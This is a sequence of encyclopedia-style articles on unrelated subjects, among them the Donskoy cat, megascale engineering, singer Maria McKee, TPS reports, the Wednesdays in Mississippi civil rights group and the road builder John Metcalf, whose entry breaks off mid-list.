In 2008 a sequel trilogy for young adults was proposed, with the main characters being Jonathan&#x27;s 14-year-old orphaned twin nephews. The stories would have been partly set in Roman Britain. The first book was to be published in March 2010. The working title for the trilogy was the Flavian Trilogy, with individual stories &quot;Brothers of Jackals&quot;, &quot;Companion of Owls&quot; and &quot;Prey of Lions&quot;. On her blog and website, Caroline Lawrence has said the content was deemed &quot;too edgy&quot; for the Roman Mysteries brand and as a result has been put on hold indefinitely.

In April 2010, author Caroline Lawrence announced that she is planning a spinoff for younger readers. The main character will be Threptus, an 8-year-old Ostian beggar boy who makes appearances in the final Roman Mystery, &quot;The Man from Pomegranate Street&quot; and the final short story in &quot;The Legionary from Londinium and other mini-mysteries&quot;.

==Special features==
Each of the novels has at least one map of the area covered in the story, sometimes also plans or diagrams; these are by Richard Russell Lawrence. The chapters are called scrolls, after the rolls of papyrus which were Roman &#x27;books&#x27;, and are numbered with Roman numerals. The glossary explaining Roman terms is called &quot;Aristo&#x27;s Scroll&quot;, after Flavia&#x27;s tutor, and the author&#x27;s note, which separates fact from fiction, is called &quot;The Last Scroll&quot;.

==TV series==

The BBC produced a television series based on the books, entitled &quot;Roman Mysteries&quot;. The first season was broadcast in 2007, the second season in 2008.

<doc id="1065488" wikidata="Q5908714" url="?curid=1065488" title="Quinqui jargon">
<text>Quinqui [[jargon]] is associated with &quot;quincalleros&quot; (an itinerant group). They are a semi-nomadic people who live mainly in the northern half of Spain. They prefer to be called &quot;mercheros&quot;. They have declined in number from earlier reports and are possibly vanishing as a distinct ethnic group.

The language is based on &quot;Germanía&quot;, an old Spanish criminal argot. It has elements of &quot;Caló&quot;, a dialect of the Spanish Roma. The term comes from the word &quot;quincallería&quot; (ironmongery), from ironmongers who first used this cant as part of their trade. 

Because the men were frequently blamed for petty crime, the word is associated in modern Spanish with delinquents, petty thieves, or hoodlums. The mercheros identify as a distinct group separate from the Roma &quot;gitanos&quot;.

Scholars have many theories about the social origins of &quot;mercheros&quot;, summarized as the following: 
*Descendants of mechanical workers who arrived in Spain from central Europe in the 16th century;
*Descendants of peasants who lost their land in the 16th century; 
*Descendants of intermarriage between the Roma and non-Roma populations; 
*Descendants of Muslims who became nomads after the expulsion in the 15th century to escape persecution; and/or 
*A mixture of the above.

==Notable mercheros==
*Eleuterio Sánchez, a.k.a. &quot;El Lute&quot; (born 1942). A petty thief in his early life, he was convicted of armed robbery and murder. After escaping from prison, he was listed among Spain&#x27;s &quot;Most Wanted&quot; criminals by the Spanish police. Later he earned a law degree and wrote five books. He was pardoned at age 39.

<doc id="1065489" wikidata="Q7303" url="?curid=1065489" title="Donskoy cat">
<text>The Donskoy cat, also known as Don Sphynx or Russian Hairless, is a hairless cat breed of Russian origin. It is not related to the better-known Sphynx cat (Canadian Hairless) whose characteristic hairlessness is caused by a recessive mutation in the keratin 71 gene. The Donskoy&#x27;s hairlessness, on the other hand, is caused by a dominant mutation.

== History ==
The Donskoy breed is able to be traced back to one kitten. This breed started in 1987 with the discovery of a hairless cat in the Russian city of Rostov-on-Don by cat breeder Elena Kovaleva. She had rescued a blue tortoiseshell kitten, which she named Varvara. At around four months of age, the cat began to lose fur. Varvara mated with a local tomcat and produced a litter of kittens. Some were born hairless, and the others started with hair but lost it like their mother. These kittens are the founding stock of the Donskoy breed and were later outcrossed with European Shorthair cats. 

Over time, breeders learned more about the Donskoy&#x27;s hair loss gene. Unlike the recessive gene carried by the Sphynx, the Donskoy&#x27;s gene is dominant. So, all cats with the gene either are born hairless or lose their coats as they grow.

The Donskoy was first officially recognized by the World Cat Federation (WCF) in 1987 and by The International Cat Association (TICA) in 2005. The standard of points describes the cat as being medium-sized and muscular, with large ears, almond shaped eyes and distinctive long, webbed toes. They require frequent grooming, in spite of their lack of coat. However, over-bathing can cause the skin to become very oily.

The Peterbald breed was originally created by crossing Donskoy with Oriental Shorthair cats to create a hairless cat of Oriental-type. Matings between the Donskoy and the Peterbald are no longer permitted since 2000, and outcrossing is not permitted, except with the domestic shorthair, due to the effect of the Donskoy&#x27;s dominant hairless mutation.

=== Breeding ban ===
Since 2014, it is illegal in the Netherlands to breed with parent cats which bear genetic mutations or other physical abnormalities that cause health or welfare issues in their offspring. The lack of protective fur in hairless cats, such as the Donskoy, is one of these banned mutations in parent cats.

== Physical appearance ==
The most striking physical characteristics of Donskoy cats is its hairlessness. Unlike many cats, Donskoys lack whiskers as well. Donskoys are medium sized, muscular cats in build. Their heads are triangular, with large ears and eyes which give Donskoys an elf-like appearance. Donskoy skin is very wrinkled, especially concentrated on the face, neck, chest, and the base of its tail. 

Skin and eye color can range in Donskoy cats. Skin pattern colors tend to appear faded. While  eye color can range from blue, green, amber, orange, yellow, or brown.

Some Donskoy cats may grow a faint fur coat during colder winter months, but the hair eventually falls off as warmer weather months return.

== Types of Donskoys ==
Donskoys can be segmented into four different categories, based primarily on the types of coats and the amount of hairlessness. See categories below.

Rubber Bald: Born completely bald these Donskoys will remain that way throughout their lives.

Flock Coat: Flock Coat Donskoys are born with a light peach-fuzz like coat. Eventually as these Donskoys grow, they will often lose the fuzz and become completely bald.

Velour Coat: Unlike the Flock Coat and Rubber Bald, these Donskoy kittens are born with a wavy, short coat and a bald spot of the top of their heads. The wavy coat is short-lived, as within the first year, the kittens will lose their hair. Some Velour Coat Donskoys will continue to have a small amount of fuzz on their face, legs, and tail. Other Velour Coat Donskoys will lose all of their hair and become completely bald.

Brush Coat: Like the Velour Coat, the Brush Coat is also born with a short coat of fur; however, it is usually bristly or wiry. These Donskoys have bald spots on their head, neck, and back and do not lose the rest of fur as they grow. The Brush Coat Donskoy is the only type of Donskoy disqualified from the show ring.

== Health ==
Not all cat registries recognize the Donskoy, and there are some concerns about the genetic health of the breed. The dominant genetic mutation causing hairlessness in Peterbalds and Donskoys could cause feline ectodermal dysplasia in its homozygous form, causing problems including poor dentition and compromised ability to lactate or sweat. Similar dominant mutations (such as in FOXI3) cause the condition in hairless dogs, and the symptoms in dominant-type hairless cats and dogs mirror those of human ectodermal dysplasia (which also results in sparse or absent hair).

== Demeanor ==
Unlike some other cat breeds, the Donskoy cat is extremely social. Beyond its hairlessness, the Donskoy cat is very intriguing and inquisitive and soft-hearted. Donskoy cats are typically active, therefore they require sufficient stimulation to keep them entertained. They spent more time moving around than the average cat. Due to their social behavior Donskoy cats do not do well being left alone for long periods of time. 

Additionally, Donskoys are friendly and extremely intelligent. These characteristics make Donskoy cats ideal for training. The Donskoy cat’s good and gentle nature, along with social demeanor, makes them perfectly suited for families and are also great with children. The general disposition of the Donskoy cat is loving and amiable.

Thanks to their demeanor, Donskoys usually get along well with other cat breeds especially other playful cats. Their activity levels can cause challenges with older cats. Donskoys are capable of getting along with dogs as well, if properly introduced.

<doc id="1065499" wikidata="Q6808853" url="?curid=1065499" title="Megascale engineering">
<text>Megascale engineering (or macro-engineering) is a form of exploratory engineering concerned with the construction of structures on an enormous scale. Typically these structures are at least in length—in other words, at least one megameter, hence the name. Such large-scale structures are termed megastructures.

In addition to large-scale structures, megascale engineering is also defined as including the transformation of entire planets into a human-habitable environment, a process known as terraforming or planetary engineering. This might also include transformation of the surface conditions, changes in the planetary orbit, and structures in orbit intended to modify the energy balance.

Astroengineering is the extension of &quot;megascale engineering&quot; to megastructures on a stellar scale or larger, such as Dyson spheres, Ringworlds, and Alderson disks.

Several megascale structure concepts such as Dyson spheres, Dyson swarms, and Matrioshka brains would likely be built upon space-based solar power satellites. Other planetary engineering or interstellar transportation concepts would likely require space-based solar power satellites and the accompanying space logistics infrastructure for their power or construction.

Megascale engineering often plays a major part in the plot of science fiction movies and books. The micro-gravity environment of outer space provides several potential benefits for the engineering of these structures. These include minimizing the loads on the structure, the availability of large quantities of raw materials in the form of asteroids, and an ample supply of energy from the Sun. The capabilities to employ these advantages are not yet available, however, so they provide material for science fiction themes.

Quite a few megastructures have been designed on paper as exploratory engineering. However, the list of existing and planned megastructures is complicated by the ambiguity in classifying what exactly constitutes a megastructure. By strict definition, no megastructures currently exist (with the space elevator being the only such project under serious consideration). By more lenient definitions, the Great Wall of China () counts as a megastructure.

A more complete list of conceptual and existing megastructures, along with a discussion of megastructure criteria, is found under megastructure.

Of all the proposed megastructures, only the orbital elevator, the Lofstrom launch loop, and Martian or lunar space elevator concepts could be built using conventional engineering techniques, and are within the grasp of current material science. Carbon nanotubes may have the requisite tensile strength for the more technologically challenging Earth-based space elevator, but creation of nanotubes of the required length is a laboratory exercise, and adequate cable-scale technology has not yet been shown at all.

The assembly of structures &quot;more&quot; massive than a space elevator would likely involve a combination of new engineering techniques, new materials, and new technologies. Such massive construction projects might require the use of self-replicating machines to provide a suitably large &quot;construction crew&quot;. The use of nanotechnology might provide both the self-replicating assemblers, and the specialized materials needed for such a project. Nanotechnology is, however, another area of speculative exploratory engineering at this time.

<text>Hellalive is the first live album by American heavy metal band Machine Head.

The album was released to fulfill Machine Head&#x27;s commitment to Roadrunner Records (the band released &quot;Through the Ashes of Empires&quot; shortly after). Former Vio-lence guitarist Phil Demmel is present on &quot;None But My Own&quot; and &quot;The Burning Red&quot;, in place of Ahrue Luster, due to these songs being taken from 2002&#x27;s Full Force Festival and by that time Luster had left the band. Demmel filled in, as is credited in the liner notes to &quot;Hellalive&quot; and he later joined the band as permanent lead guitarist. As of 2012 the album has sold over 38,000 copies in the United States and an estimated 78,000 copies worldwide since its 2003 release.

<text>Lepaca Kliffoth is the fourth studio album by Swedish symphonic metal band Therion. The title refers to the qlippoth. Stylistically, it retains the aggressive riffing and sheds the harsh growls of the band&#x27;s previous death metal output, while also incorporating more elements of traditional heavy metal and more pronounced gothic and symphonic elements, often leading to this album being viewed as a transitional album in Therion&#x27;s discography.

== Reception ==
For Metal Storm, the album &quot;stands between the band&#x27;s more Death roots and later symphonic grandiosity&quot; and &quot;turns out to be a fine piece of work, the great songwriting, mixed with Arabic-influenced keyboards is remarkable, and those mysterious lyrics just add more charm&quot;.

Deathmetal.org states that &quot;Lepaca Kliffoth&quot; &quot;should be avoided by the serious listener&quot; because the structural genius of earlier Therion albums is here only available as distracting ornamentation, rendering it &quot;very cheesy radio hard rock&quot;.

==Track listing==
Lyrics and Music by Christofer Johnsson, except where stated.

*&quot;Enter the Voids&quot; was previously released before only on the original LP version of &quot;Lepaca Kliffoth&quot;
*The first release of digipack from November 15, 1996, has a black tray and missing #8 track &quot;Sorrows of the Moon&quot; on the back cover. The second release (ca. 1999) has a clear tray, fixed track listing, and additional pictures on the inside cover.

<doc id="1065507" wikidata="Q5637189" url="?curid=1065507" title="Hack writer">
<text>Hack writer is a pejorative term for a writer who is paid to write low-quality, rushed articles or books &quot;to order&quot;, often with a short deadline. In fiction writing, a hack writer is paid to quickly write sensational, pulp fiction such as &quot;true crime&quot; novels or &quot;bodice ripping&quot; paperbacks. In journalism, a hack writer is deemed to operate as a &quot;mercenary&quot; or &quot;pen for hire&quot;, expressing their client&#x27;s political opinions in pamphlets or newspaper articles. Hack writers are usually paid by the number of words in their book or article; as a result, hack writing has a reputation for quantity taking precedence over quality.

==History==
The term &quot;hack writer&quot; was first used in the 18th century, &quot;when publishing was establishing itself as a business employing writers who could produce to order.&quot; The derivation of the term &quot;hack&quot; was a &quot;shortening of hackney, which described a horse that was easy to ride and available for hire.&quot; In 1728, Alexander Pope wrote &quot;The Dunciad&quot;, which was a satire of &quot;the Grub-street Race&quot; of commercial writers who worked in Grub Street, a London district that was home to a bohemian counterculture of impoverished writers and poets. In the late 19th century, Anthony Trollope&#x27;s novel &quot;The Way We Live Now&quot; (1875) depicts a female hack writer whose career was built on social connections rather than writing skill.

Many authors who would later become famous worked as low-paid hack writers early in their careers, or during a downturn in their fortunes. As a young man, Anton Chekhov had to support his family by writing short newspaper articles; Arthur Koestler penned a dubious &quot;Dictionary of Sexuality&quot; for the popular press; Samuel Beckett translated for the French &quot;Reader&#x27;s Digest&quot;; and William Faulkner churned out Hollywood scripts.

A number of films have depicted hack writers, perhaps because the way these authors are &quot;prostituting&quot; their creative talents makes them an interesting character study. In the film adaptation of Carol Reed&#x27;s &quot;The Third Man&quot; (1949), author Graham Greene added a hard-drinking hack writer named Holly Martins. In Jean-Luc Godard&#x27;s film &quot;Contempt&quot; (1963), a hack screenwriter is paid to doctor a script. In the film &quot;Adaptation&quot; (2002), Nicolas Cage depicts an ill-educated character named Donald Kaufman who finds he has a knack for churning out cliché-filled film scripts.

==Use as a pejorative==

In the US, the term &quot;hack&quot; is used as a pejorative description among writers, journalists, bloggers, and comedians. It is especially used for journalists that are perceived to take partisan sides.

The term &quot;hack&quot; has been used by some UK journalists as a form of humorous, self-deprecating self-description. The term was popularized in the UK by &quot;Private Eye&quot; magazine, which refers to male journalists as &quot;hacks&quot; and female journalists as &quot;hackettes.&quot;

<doc id="1065514" wikidata="Q269549" url="?curid=1065514" title="Maria McKee">
<text>Maria Luisa McKee (born August 17, 1964) is an American singer-songwriter. She is best known for her work with Lone Justice, her 1990 song &quot;Show Me Heaven&quot;, and her song &quot;If Love Is a Red Dress (Hang Me in Rags)&quot; from soundtrack of the film &quot;Pulp Fiction&quot;.

==Early life==
Maria McKee was born in Los Angeles in 1964. She grew up in a bohemian family and is the half-sister of Bryan MacLean (1946-1998), the guitarist of the band Love (he died in 1998 at age 52).

==Music==
McKee was a founding member of the cowpunk and proto-Americana band Lone Justice in 1982, with whom she released two albums. In 1983, she sang the song &quot;Never Be You&quot; for the soundtrack of the movie &quot;Streets of Fire&quot; (1984). Several compilations, of both previously released and unreleased material, and a BBC &quot;Live in Concert&quot; album, have been released since the group disbanded in 1987. Bob Dylan wrote the song &quot;Go Away Little Boy&quot; for the band&#x27;s debut album, &quot;Lone Justice&quot;, which later appeared as a B-side. The band opened for such acts as U2 and Tom Petty. During this period of her career, she was managed by Jimmy Iovine.

When she was 19, McKee wrote Feargal Sharkey&#x27;s 1985 song &quot;A Good Heart&quot;, which she has since recorded and released herself on her album &quot;Late December&quot;. Sharkey also covered &quot;To Miss Someone&quot;, from her self-titled solo debut, on his third solo album, &quot;Songs from the Mardi Gras&quot;. In 1987, she appeared in the Robbie Robertson music video &quot;Somewhere Down the Crazy River&quot; (directed by Martin Scorsese), and contributed back-up vocals to his debut solo album, which included the song. McKee released her first solo, self-titled album in 1989, on which Richard Thompson played guitar and Steve Wickham (from The Waterboys) played fiddle. It received critical acclaim in Europe, prompting McKee to move to Ireland.

Her song &quot;Show Me Heaven&quot;, which appeared on the soundtrack to the film &quot;Days of Thunder&quot;, topped the charts in Belgium, the Netherlands, Norway, and the United Kingdom, where the song topped the UK Singles Chart for four weeks, becoming Britain&#x27;s sixth biggest-selling song of 1990. Additionally, &quot;Show Me Heaven&quot; became McKee&#x27;s second number one – and first self-performed – song on the UK Singles Chart after Sharkey&#x27;s &quot;A Good Heart&quot; topped the chart in November 1985. She rarely performed this song in public until recently, before she sang it at Dublin Pride.

Her song &quot;If Love Is a Red Dress (Hang Me in Rags)&quot; was personally selected by Quentin Tarantino for his feature film &quot;Pulp Fiction&quot;. It is the only original song on the soundtrack.

In 1992, she released the song &quot;Sweetest Child&quot;, which was produced by Youth and featured Robert &quot;Throb&quot; Young from the band Primal Scream.

Following her debut, McKee released five studio records and two live albums. The album &quot;Life Is Sweet&quot; featured her lead guitar work described as &quot;feral&quot; by the British &quot;Mojo&quot; magazine, which listed it as a runner-up to album of the year in their critics’ poll. The raw, postmodern album (produced by Mark Freegard) was a marked shift from her previous roots rock style. Her later three records, &quot;High Dive&quot; (2003), &quot;Peddlin&#x27; Dreams&quot; (2005) and &quot;Late December&quot; (2007), were released independently via her own label, Viewfinder Records (distributed in the UK via Cooking Vinyl).

In 1995, Bette Midler recorded two of McKee&#x27;s songs—&quot;To Deserve You&quot; and &quot;The Last Time&quot;—for her platinum album, &quot;Bette of Roses&quot;. In 1998, country trio The Chicks recorded McKee&#x27;s &quot;Am I the Only One (Who&#x27;s Ever Felt This Way?)&quot;, featuring several notable solos by fiddler Martie Maguire. The band included the track on their Grammy-nominated debut album &quot;Wide Open Spaces&quot;. In 2003, during their &quot;Top of the World&quot; Tour, The Chicks invited opening act Joan Osborne back to the stage to perform the song with them on several occasions.

McKee appears on the 2014 compilation &quot;Songs from a Stolen Spring&quot; that paired Western musicians with artists from the Arab Spring. On the album, her performance of the Tony Joe White song &quot;Ol&#x27; Mother Earth&quot; was meshed with &quot;I Still Exist&quot; by the Egyptian band Massar Egbari.

She recorded a medley of &quot;Ride a White Swan&quot; and &quot;She Was Born to Be My Unicorn&quot; for the Marc Bolan tribute album &quot;Angel Headed Hipster&quot;, produced by Hal Willner. The album also includes tracks by Gavin Friday, Father John Misty and Nick Cave.

==Session and guest work==
In addition to writing Sharkey&#x27;s song, &quot;A Good Heart&quot;, McKee has contributed to the Victoria Williams&#x27; tribute album &quot;Sweet Relief&quot;, on the song &quot;Opelousas (Sweet Relief)&quot;. She has also provided backing vocals to U2&#x27;s cover of Creedence Clearwater Revival&#x27;s &quot;Fortunate Son&quot; (B-side of 1992 &quot;Who&#x27;s Gonna Ride Your Wild Horses&quot; single from their &quot;Achtung Baby&quot; album), as well as to Counting Crows&#x27; 1993 debut &quot;August and Everything After&quot; on &quot;Sullivan Street&quot; and &quot;Mr. Jones&quot;. On Robin Zander&#x27;s 1993 solo album she sang backing vocals for the track &quot;Reactionary Girl&quot;. She also sang backing vocals on Robbie Robertson&#x27;s debut and self-titled solo album, on the track &quot;American Roulette&quot;. Much lesser known is her contribution of lead and co-lead vocals on two tracks on a contemporary Christian praise and worship album called &quot;Come As You Are&quot;.

She also contributed a song, &quot;Never Be You,&quot; for the soundtrack to the Walter Hill movie &quot;Streets of Fire&quot;. She recorded a duet, &quot;Friends in Time&quot;, with The Golden Horde on their eponymously titled album in 1991. She also recorded the duet &quot;This Road is Long&quot; with Stuart A. Staples of the band Tindersticks on his 2006 album &quot;Leaving Songs.&quot; In addition she co-wrote a duet titled &quot;Promise You Anything&quot; with Steve Earle, which appeared on his 1990 album &quot;The Hard Way&quot;. She teamed up with Dwight Yoakam for a duet on &quot;Bury Me,&quot; from his 1986 debut, &quot;Guitars, Cadillacs, Etc., Etc.&quot; She contributed the lyrics and vocals to the song &quot;No Big Bang&quot; on the only album by The Heads, &quot;No Talking, Just Head&quot;, also playing guitar and synthesizer on the song together with the band, mostly ex-members of Talking Heads.

In 2016, she performed the Blind Willie Johnson song &quot;Let Your Light Shine On Me&quot; on the tribute album &quot;God Don&#x27;t Never Change: The Songs of Blind Willie Johnson&quot;.

==Film work==
In 2013, McKee and her husband, Jim Akin, self-released their first independent feature film, &quot;After the Triumph of Your Birth&quot;, through their production company, Shootist Films. The film was written, directed, shot, recorded, and edited by Akin and features McKee (who co-produced) in her acting debut as an ensemble cast member. They scored the film together and the soundtrack was released in 2012.

Shootist Films&#x27; second feature film &quot;The Ocean of Helena Lee&quot; (featuring her in a supporting role) was released May 2015 with accompanying soundtrack. The film played a week run at The American Cinematheque at The Egyptian Theater. Akin, McKee and drummer Tom Dunne (also an actor and lead player in the film) performed a set of music after each screening. The film screened in competition at The Indie Memphis Film Festival and The Pesaro International Film Festival as well as out of competition in The Fastnet Film Festival in Schull, Ireland.

==Published fiction==
In 2009, McKee&#x27;s short story, &quot;Charcoal&quot;, was included in the Melville House Publishing short fiction anthology &quot;Amplified: Fiction from Leading Alt-Country, Indie Rock, Blues and Folk Musicians&quot;. In 2018, an audio version of &quot;Charcoal&quot; was recorded by voice actor Patrice Gambardella and published on Bibliophone, a free audio book platform.

==Personal life==
McKee is married to musician and filmmaker Jim Akin. She came out in 2018 as pansexual, and referred to herself as a &quot;dyke&quot;. She is also an advocate for queer and transgender rights.

She is a dog lover, and she and Akin have had a range of breeds as pets over the years, including a pug, greyhound, and whippet. She also has volunteered with a greyhound adoption group. Her song &quot;My First Night without You&quot; was written after one of her pugs died.

, she lives in London, where she recorded &quot;La Vita Nuova&quot;.

<doc id="1065519" wikidata="Q1848896" url="?curid=1065519" title="Southern Lord Records">
<text>Southern Lord is an American heavy metal record label that was founded in 1998 by Greg Anderson. It initially specialized in experimental metal: particularly doom metal, stoner rock, and drone metal. The label later expanded its line-up to include artists from black metal, hardcore punk and crust punk bands.

==History==
Before co-founding their own record label Greg Anderson and Stephen O&#x27;Malley were friends and bandmates in Thorr&#x27;s Hammer and Burning Witch. The pair formed a new band named Sunn O))) in 1998 and moved to Los Angeles. They started Southern Lord as a way to have control over the releases of their own recordings.

Southern Lord&#x27;s first release was the CD version (previously released as a cassette) of Thorr’s Hammer‘s &quot;Dommedagsnatt--&quot; a doom/death metal album with Norwegian lyrics. The second release was: Burning Witch‘s &quot;Crippled Lucifer--&quot; a compilation CD of the band&#x27;s first two EPs.

Southern Lord released material by Anderson and O&#x27;Malley&#x27;s latest band, Sunn O))) in 2002. Sunn O))) was later reviewed several times by Ben Ratliff of The New York Times.

The label&#x27;s roster continued to grow with notable doom releases such as Warhorse&#x27;s &quot;As Heaven Turns to Ash,&quot; Place of Skulls &quot;Nailed and With Vision,&quot; as well as albums from Anderson&#x27;s band Goatsnake. It also expanded its musical palate releasing music by: Darkest Hour, Orcustus, and Dave Grohl‘s side project Probot.

The band Earth joined the Southern Lord family in 2005—continuing Southern Lord&#x27;s involvement in drone and doom music.

Releases from Earth, Sunn O))) (including the heavily lauded &quot;Monoliths &amp; Dimensions&quot;), and a series of Boris 7″s to go along with the album &quot;Smile&quot; took place at the end of the decade.

<doc id="1065521" wikidata="Q7671191" url="?curid=1065521" title="TPS report">
<text>A TPS report (&quot;test procedure specification&quot;) is a document used by a quality assurance group or individual, particularly in software engineering, that describes the testing procedures and the testing process.

==Definition==
The official definition and creation is provided by the Institute of Electrical and Electronics Engineers (IEEE) as follows:
==In popular culture==
=== &quot;Office Space&quot; ===
Its use in popular culture increased after the comedic 1999 film &quot;Office Space&quot;. In the movie, multiple managers and coworkers inquire about an error that protagonist Peter Gibbons (played by Ron Livingston) makes in omitting a cover sheet to send with his &quot;TPS reports&quot;. It is used by Gibbons as an example that he has eight different bosses to whom he directly reports. According to the film&#x27;s writer and director Mike Judge, the abbreviation stood for &quot;Test Program Set&quot; in the movie.

After &quot;Office Space&quot;, &quot;TPS report&quot; has come to connote pointless, mindless paperwork, and an example of &quot;literacy practices&quot; in the work environment that are &quot;meaningless exercises imposed upon employees by an inept and uncaring management&quot; and &quot;relentlessly mundane and enervating&quot;.

===Other references and allusions=== 
* In the 1991 film &quot;Don&#x27;t Tell Mom the Babysitter&#x27;s Dead&quot; the main character Sue Ellen (portrayed by Christina Applegate) is expected to know how to complete TPS reports. Once handed the insurmountable of paperwork to complete, she passes the work off to a very willing co-worker Cathy (portrayed by Kimmy Robertson) who handles the reports, but is intercepted by Sue Ellen&#x27;s nemesis who attempts to use it as leverage as a means to get the main character fired.
* In &quot;King of the Hill&quot; (also produced by Mike Judge), Kahn is being chewed out, then remarks to his boss &quot;No sir, I filed my TPS report yesterday.&quot;
* The 2015 puzzle video game &quot;Please, Don&#x27;t Touch Anything&quot; featured the question &quot;What is a TPS Report?&quot; as one of many hidden clues that lead to a unique ending.
* In &quot;Lost&quot; season 1, episode 4, John Locke&#x27;s boss says &quot;Locke, I told you I need those TPS reports done by noon today.&quot;
* In &quot;Ralph Breaks the Internet&quot;, a TPS report is visibly hanging in one of the accounting department cubicles during Ralph&#x27;s viral video montage. While Test Procedure Specification reports are not functionally relevant within accounting, this usage shows how the term has grown to symbolize all kinds of meaningless memoranda.
* In &quot;Borderlands 2&quot;, a legendary weapon is named the &quot;Actualizer&quot; with a flavor text description of &quot;We need to talk about your DPS reports&quot;, parodying the corporate term by replacing it with the common gaming abbreviation for &quot;Damage Per Second&quot;.
* In &quot;The Mandalorian&quot;, TPS reports are mentioned in the episode &quot;Chapter 15: The Believer&quot; as work to do by the character Migs Mayfeld when attempting to avoid an imperial officer, in a reference to &quot;Office Space&quot;.
* The TV series &quot;The Family Man&quot; features a scene in series 2, episode 1 in which the manager of the protagonist asks him to &quot;start thinking about your TPS reports!&quot;, in amongst other apparent references to &quot;Office Space&quot;.
* In the &quot;NCIS&quot; episode &quot;Starting Over&quot;, Gary Cole&#x27;s Agent Parker mentions his least favorite paperwork being TPS reports. When McGee corrects him telling him they&#x27;re &quot;TBS reports&quot;, he says, &quot;Ah, old habits, weird&quot;, then takes a sip of coffee, paying homage to his &quot;Office Space&quot; character, Bill Lumbergh.
* In Season 4, Episode 10 (&quot;High&quot;) of &quot;Rescue Me&quot;, Janet Gavin starts a new job and hands off a TPS report at the beginning of the scene.
* In the &quot;Terry Tate: Office Linebacker&quot;, Terry Tate yells, &quot;You know you need a coversheet on your TPS reports Richard!&quot;
* In Season 2, during the first segment of the 28th episode of &quot;Puppy Dog Pals&quot; titled &quot;Take Your Dog to Work Day&quot;, while Bingo and Rolly are playing office, Bingo says &quot;One sec Rolly, these TPS reports aren&#x27;t gonna fix themselves.&quot;
* In &quot;Doom&quot; 2016, some control consoles in early levels reference TPS Reports.
* Early in &quot;Black Mesa&quot;, protagonist Gordon Freeman encounters two scientists discussing TPS reports.

<doc id="1065522" wikidata="Q7979248" url="?curid=1065522" title="Wednesdays in Mississippi">
<text>Wednesdays in Mississippi was an activist group during the Civil Rights Movement in the United States during the 1960s. Northern women of different races and faiths traveled to Mississippi to develop relationships with their southern peers and to create bridges of understanding across regional, racial, and class lines. By opening communications across societal boundaries, Wednesday’s Women sought to end violence and to cushion the transition towards racial integration.

==Background==
In the spring of 1964 Dorothy I. Height, President of the National Council of Negro Women (NCNW), working with NCNW volunteer Polly Spiegel Cowan, came up with the idea of sending weekly teams of northern women to Mississippi.

The teams were interracial and interfaith. They would leave for Mississippi on a Tuesday and return on a Thursday. They were there all day on Wednesday, the program was known as &quot;Wednesdays in Mississippi.&quot; Competent, well connected, and educated, these women worked with Freedom Summer and the Freedom Schools.

In 1964, Height and Cowan brought Doris Wilson and Susie Goodwillie into Wednesdays in Mississippi to direct the project from Jackson, Mississippi.

The black women from the north visited with black women from the south; the white women from the north reached out to white women in the south. The women from the north went home with a fresh commitment to social and racial justice. In 1965 they came again, this time on a more professional level, speaking teacher to teacher and social worker to social worker.

In 1966 Wednesdays in Mississippi became Workshops in Mississippi, an ongoing effort to help black women and families, and poor white women and families, achieve economic self-betterment.

In 2020, the National Trust for Historic Preservation named the Sun&#x27;n&#x27;Sands Motel in Jackson as one of America&#x27;s most endangered historic places, because of its connection to the Wednesdays in Mississippi movement.

==Goals==
The women of Wednesdays in Mississippi had many goals:
* racial justice;
* inter-racial, inter-regional, and inter-faith communications;
* working across racial and religious boundaries, opening the closed society of Mississippi;
* supporting the freedom schools and voter registration;
* helping poor women in Mississippi learn how to help themselves, how to achieve economic self-sufficiency. They taught poor women how to survive in a society where the cotton economy had collapsed for poor tenants and laborers, and where a viable new economic structure not yet developed;
* and expanding the horizons and commitments of the northern women.

== Collections ==
Archival records related to Wednesdays in Mississippi reside at the Albert and Shirley Small Special Collections Library at the University of Virginia as well as at the National Archives for Black Women&#x27;s History.

<text>John Metcalf (15 August 1717 – 26 April 1810), known as Blind Jack of Knaresborough or Blind Jack Metcalf, was the first professional road builder to emerge during the Industrial Revolution. Blind from the age of six, Metcalf had an eventful life, which was documented by his own account just before his death. He was an accomplished diver, swimmer, card player and fiddler, but was better known for the period between 1765 and 1792 when he built about of turnpike road, mainly in the north of England and as such, he became known as one of the &quot;fathers of the modern road&quot;.

His work on the roads in the north has been commemorated in a pub named after him, a statue in Knaresborough town centre and part of the A658 in Harrogate being named &quot;John Metcalf Way&quot;.

==Early life==
Metcalf was born into a poor family in Knaresborough in Yorkshire, England on 15 August 1717. His father was a horse breeder. At the age of six John lost his sight after a smallpox infection; he was given fiddle lessons as a way of making provision for him to earn a living later in life. He became an accomplished fiddler and made it his livelihood in his early adult years. In 1732, aged 15, Metcalf succeeded one Mr Morrison as fiddler at the Queen&#x27;s Head, a tavern in Harrogate. Morrison had played there for 70 years. Metcalf had an affinity for horses and added to his living with horse trading. Though blind, he took up swimming and diving, fighting cocks, playing cards, riding and even hunting. He knew his local area so well he was paid to work as a guide to visitors.

When he was 20, Metcalf met Dorothy Benson, the daughter of the landlord of the Granby Inn in Harrogate. When he was aged 21 he met another woman and made her pregnant; Dorothy begged him not to marry her and Jack fled. He spent some time living at places on the North Sea coast between Newcastle and London, and lodged with his aunt in Whitby. He continued to work as a fiddler. When he heard Dorothy was to be married to a shoemaker, he returned and they fled so they could get married in secret. They married and had four children. Dorothy died in 1778.

His fiddle playing gave him social connections and a patron, Colonel Liddell, Member of Parliament for Berwick-on-Tweed. In a much-repeated story, in 1739 the colonel and Metcalf had a wager of 10 guineas as to who could travel the from London to Harrogate first; Jack on foot or the colonel in his coach. Jack took five and half days, and arrived first, despite his blindness, the state of the roads having slowed the colonel.

During the Jacobite rising of 1745 Metcalf&#x27;s connections got him the job of assistant to the royal recruiting sergeant in the Knaresborough area. He accompanied the army to Scotland where he did not experience action but was employed moving guns over boggy ground. He was captured but released. He used his Scottish experience to import Aberdeen stockings to England.

==Career==
Before army service, Metcalf worked as a carrier using a four-wheeled chaise and a one-horse chair on local trips. When competition cut into the business he switched to carrying fish from the coast to Leeds and Manchester. After 1745 he bought a stone wagon and worked it between York and Knaresborough. By 1754 his business had grown to a stagecoach line. He drove the coach himself, making two trips a week during the summer and one in the winter months.

==Road builder==

In 1765 Parliament passed an act authorising turnpike trusts to build toll roads in the Knaresborough area. There were few people with road-building experience and Metcalf seized the opportunity, building on his practical experience as a carrier.

He won a contract to build a three-mile (5 km) section of road between Minskip and Ferrensby on the road from Harrogate to Boroughbridge. He explored the section of countryside alone and worked out the most practical route.

Metcalf built roads in Lancashire, Derbyshire, Cheshire and Yorkshire, including roads between:

* Knaresborough and Wetherby
